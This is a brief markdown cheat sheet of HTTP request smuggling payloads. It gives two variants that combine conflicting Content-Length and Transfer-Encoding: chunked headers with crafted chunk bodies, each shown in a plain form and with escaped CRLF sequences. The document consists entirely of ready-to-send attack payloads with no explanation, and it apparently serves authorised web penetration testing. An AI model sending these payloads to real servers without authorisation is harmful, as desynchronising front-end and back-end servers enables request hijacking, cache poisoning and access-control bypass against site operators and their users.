# Request Smuggling Cheat Sheet
![alt text](Images/image-18.png)

## Payload 1
### Without special characters
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
nap
X

```

### With special characters
```
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
3\r\n
nap\r\n
X\r\n

```

## Payload 2
### Without special characters
```
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### With special characters
```
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
X
```